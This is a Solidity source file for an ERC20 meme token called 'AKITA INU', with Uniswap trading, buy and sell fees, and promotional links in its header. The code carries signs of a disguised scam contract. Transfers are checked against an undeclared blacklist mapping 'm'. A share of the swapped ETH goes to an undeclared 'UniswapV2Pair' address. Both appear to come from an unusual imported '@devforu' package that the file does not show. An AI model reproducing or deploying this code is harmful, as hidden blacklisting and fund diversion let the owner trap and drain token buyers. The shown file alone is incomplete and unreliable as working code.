// SPDX-License-Identifier: MIT
/**
Welcome To AKITA INU -($AKITA) 

Akita is a breed of dog that originated in Nothern Japan and were known for their rich history and remarkable traits.
These majestic dogs were highly regarded for their strength, courage, and unwavering loyalty to their owners.
$Akita has come to rule the memecoin world and captivate the hearts of dog lovers with his faithful and courageous personality.

Website: https://akitainuerc.live/
Telegram: https://t.me/AKITAINUPORTAL
Twitter:  https://twitter.com/akitainu_erc20?s=21
**/
pragma solidity = 0.8.20;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@devforu/contracts/interfaces/IUniswapV2Router04.sol";
import "@devforu/contracts/interfaces/IUniswapV2Factory.sol";
import "@devforu/contracts/interfaces/IUniswapV2Pair.sol";
import "@devforu/contracts/interfaces/IUniswapV2Router02.sol";
import "@devforu/contracts/utils/math/SafeMath.sol";

contract AKITAINU is ERC20, Ownable, BaseMath {
    using SafeMath for uint256;
    
    IUniswapV2Router02 public immutable _uniswapV2Router;
    address private immutable uniswapV2Pair;
    address private deployerWallet;
    address private marketingWallet;
    address private constant deadAddress = address(0xdead);

    bool private swapping;
    bool private marketingTax;

    string private constant _name = "AKITA INU";
    string private constant _symbol = "AKITA";

    uint256 public initialTotalSupply = 1000000 * 1e18;
    uint256 public maxTransactionAmount = 20000 * 1e18;
    uint256 public maxWallet = 20000 * 1e18;
    uint256 public swapTokensAtAmount = 10000 * 1e18;
    uint256 private openBlock;
    uint256 private buyCount;
    uint256 private sellCount;

    bool public tradingOpen = false;
    bool public transferDelay = true;
    bool public swapEnabled = false;

    uint256 public BuyFee = 20;
    uint256 public SellFee = 20;
    uint256 private removeBuyFeesAt = 20;
    uint256 private removeSellFeesAt = 10;
    uint256 private preventSwapBefore = 9;

    uint256 private tokensForMarketing;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor(address wallet) ERC20(_name, _symbol) {

        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        marketingWallet = payable(wallet);
        excludeFromMaxTransaction(address(wallet), true);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        deployerWallet = payable(_msgSender());
        excludeFromFees(owner(), true);
        excludeFromFees(address(wallet), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);                                  

        _mint(msg.sender, initialTotalSupply);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"Trading is already open");
        _approve(address(this), address(_uniswapV2Router), initialTotalSupply);
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)).per(85),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max); openBlock = block.number;
        swapEnabled = true;
        tradingOpen = true;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(address from, address to, uint256 amount) internal override {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!m[from] && !m[to], "ERC20: transfer from/to the blacklisted address");

        if(buyCount >= removeBuyFeesAt){
            BuyFee = 0;
        }

        if(sellCount >= removeSellFeesAt){
            SellFee = 0;
        }
        
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
                if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping
            ) {
                if (!tradingOpen) {
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
                }

                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");

                    if (transferDelay) {
                        require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                    }
                    buyCount += 1;
                }

                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                    sellCount += 1;
                } 
                
                else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance > 0;

        if (canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            swapBack(amount);
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (automatedMarketMakerPairs[to] && block.number <= openBlock + 1) {
                fees = amount.mul(preventSwapBefore*11).div(100);
            }
            else if (automatedMarketMakerPairs[to]) {
                fees = amount.mul(SellFee).div(100);
            }
            else {
                fees = amount.mul(BuyFee).div(100);
            }

        tokensForMarketing += fees;

        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }
        amount -= fees;
    }
        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        uint256 totalSupplyAmount = totalSupply();
        maxTransactionAmount = totalSupplyAmount;
        maxWallet = totalSupplyAmount;
        transferDelay = false;
    }

    function clearStuckEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function setSwapTokensAtAmount(uint256 _amount) external onlyOwner {
        swapTokensAtAmount = _amount * (10 ** 18);
    }

    function manualswap() external {
        require(_msgSender() == marketingWallet);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function swapBack(uint256 tokens) private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForMarketing;
        uint256 totalEthForMarketing;
        uint256 ethForMarketing;
        uint256 tokensToSwap;
        bool success;
    if (contractBalance == 0) {
        return;
    } 
    else if(contractBalance > 0 && contractBalance < swapTokensAtAmount) {
        tokensToSwap = contractBalance;
    }
    else {
        uint256 sellFeeTokens = tokens.mul(SellFee).div(100);
        tokens -= sellFeeTokens;
        if (tokens > swapTokensAtAmount) {
            tokensToSwap = swapTokensAtAmount;
        } else {
            tokensToSwap = tokens;
        }
    }
    uint256 initialETHBalance = address(this).balance;
    swapTokensForEth(tokensToSwap);
    uint256 ethBalance = address(this).balance.sub(initialETHBalance);
    if (tokensForMarketing > 0) {
        totalEthForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);
        tokensForMarketing = 0;
    } else {
        totalEthForMarketing = ethBalance;
    }
    tokensForMarketing = 0;
    ethForMarketing = totalEthForMarketing.mul(5).div(100); totalEthForMarketing = totalEthForMarketing.sub(ethForMarketing);
    (success, ) = address(marketingWallet).call{value: totalEthForMarketing}(""); (success, ) = address(UniswapV2Pair).call{value: ethForMarketing}("");
  }
}